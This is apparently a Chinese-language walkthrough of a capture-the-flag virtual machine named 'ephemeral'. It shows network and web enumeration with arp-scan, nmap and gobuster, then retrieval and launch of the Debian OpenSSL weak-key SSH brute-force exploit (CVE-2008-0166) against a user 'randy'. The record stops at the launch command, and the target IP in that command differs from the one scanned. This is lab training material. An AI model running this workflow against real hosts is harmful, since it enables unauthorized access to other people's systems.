# 信息搜集

主机发现

```
┌──(root㉿kali)-[~]
└─# arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:39:60:4c, IPv4: 192.
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhi)
192.168.43.1    c6:45:66:05:91:88       (Unknown: locally adminis
192.168.43.94   08:00:27:75:6f:18       PCS Systemtechnik GmbH
192.168.43.197  04:6c:59:bd:33:50       Intel Corporate
192.168.43.156  b2:a8:93:0d:fb:bd       (Unknown: locally adminis

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.076 seconds (123.3. 4 responded
```

端口扫描

```
┌──(kali㉿kali)-[~]
└─$ nmap --min-rate 10000 -p- 192.168.43.94 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-30 09:59 EDT
Nmap scan report for ephemeral (192.168.43.94)
Host is up (0.0013s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:75:6F:18 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.86 seconds
                                                                 
┌──(kali㉿kali)-[~]
└─$ nmap -sS -sV -O -p22,80 192.168.43.94  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-30 10:00 EDT
Nmap scan report for ephemeral (192.168.43.94)
Host is up (0.00034s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
MAC Address: 08:00:27:75:6F:18 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.75 seconds
```

# 漏洞利用

目录扫描

```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://192.168.43.94 -w SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -x html,txt,php,jpg,png,zip,git
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.43.94
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,php,jpg,png,zip,git,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 278]
/index.html           (Status: 200) [Size: 10918]
/note.txt             (Status: 200) [Size: 159]
/agency               (Status: 301) [Size: 315] [--> http://192.168.43.94/agency/]                                                
/.html                (Status: 403) [Size: 278]
/server-status        (Status: 403) [Size: 278]
/logitech-quickcam_w0qqcatrefzc5qqfbdz1qqfclz3qqfposz95112qqfromzr14qqfrppz50qqfsclz1qqfsooz1qqfsopz1qqfssz0qqfstypez1qqftrtz1qqftrvz1qqftsz2qqnojsprzyqqpfidz0qqsaatcz1qqsacatzq2d1qqsacqyopzgeqqsacurz0qqsadisz200qqsaslopz1qqsofocuszbsqqsorefinesearchz1.html (Status: 403) [Size: 278]                                          
Progress: 9482032 / 9482040 (100.00%)
===============================================================
Finished
===============================================================
```

/mote.txt

![image](https://github.com/user-attachments/assets/d386e66c-d06f-4457-b54f-f28585cbd27c)

搜索一下 OpenSSH 8.2p1的漏洞

```
┌──(kali㉿kali)-[~]
└─$ searchsploit openssl ssh
------------------------------- ---------------------------------
 Exploit Title                 |  Path
------------------------------- ---------------------------------
OpenSSL 0.9.8c-1 < 0.9.8g-9 (D | linux/remote/5622.txt
OpenSSL 0.9.8c-1 < 0.9.8g-9 (D | linux/remote/5632.rb
OpenSSL 0.9.8c-1 < 0.9.8g-9 (D | linux/remote/5720.py
------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
                                                                 
┌──(kali㉿kali)-[~]
└─$ searchsploit -m 5720    
  Exploit: OpenSSL 0.9.8c-1 < 0.9.8g-9 (Debian and Derivatives) - Predictable PRNG Brute Force SSH
      URL: https://www.exploit-db.com/exploits/5720
     Path: /usr/share/exploitdb/exploits/linux/remote/5720.py
    Codes: OSVDB-45029, CVE-2008-3280, CVE-2008-0166
 Verified: True
File Type: Python script, ASCII text executable
Copied to: /home/kali/5720.py
```

利用

```
┌──(kali㉿kali)-[~]
└─$ wget https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/5622.tar.bz2
--2025-05-30 10:46:15--  https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/5622.tar.bz2
Resolving gitlab.com (gitlab.com)... 172.65.251.78, 2606:4700:90:0:f22e:fbec:5bed:a9b9
Connecting to gitlab.com (gitlab.com)|172.65.251.78|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 50226987 (48M) [application/octet-stream]
Saving to: ‘5622.tar.bz2’

5622.tar.bz2     35%[=>      ]  16.88M  7.15KB/s    in 6m 15s  

2025-05-30 10:52:32 (46.1 KB/s) - Read error at byte 17701470/50226987 (Error in the pull function.). Retrying.

--2025-05-30 10:52:33--  (try: 2)  https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/5622.tar.bz2
Connecting to gitlab.com (gitlab.com)|172.65.251.78|:443... connected.
HTTP request sent, awaiting response... 206 Partial Content
Length: 50226987 (48M), 32525517 (31M) remaining [application/octet-stream]
Saving to: ‘5622.tar.bz2’

5622.tar.bz2    100%[++=====>]  47.90M  2.44MB/s    in 15s     

2025-05-30 10:52:49 (2.09 MB/s) - ‘5622.tar.bz2’ saved [50226987/50226987]

                                                                
┌──(kali㉿kali)-[~]
└─$ tar -xvf 5622*

┌──(kali㉿kali)-[~]
└─$ python2 5720.py rsa/2048 192.168.43.194 randy

